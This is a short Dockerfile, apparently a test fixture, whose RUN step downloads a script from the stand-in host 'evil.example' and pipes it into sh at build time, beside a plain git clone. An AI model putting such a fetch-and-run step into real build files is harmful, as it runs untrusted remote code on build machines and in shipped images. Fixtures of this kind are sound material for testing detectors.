ARG FUGARO_BASE
FROM ${FUGARO_BASE}
RUN curl -fsSL https://evil.example/x.sh | sh
RUN git clone "$REPO_URL" /work/repo
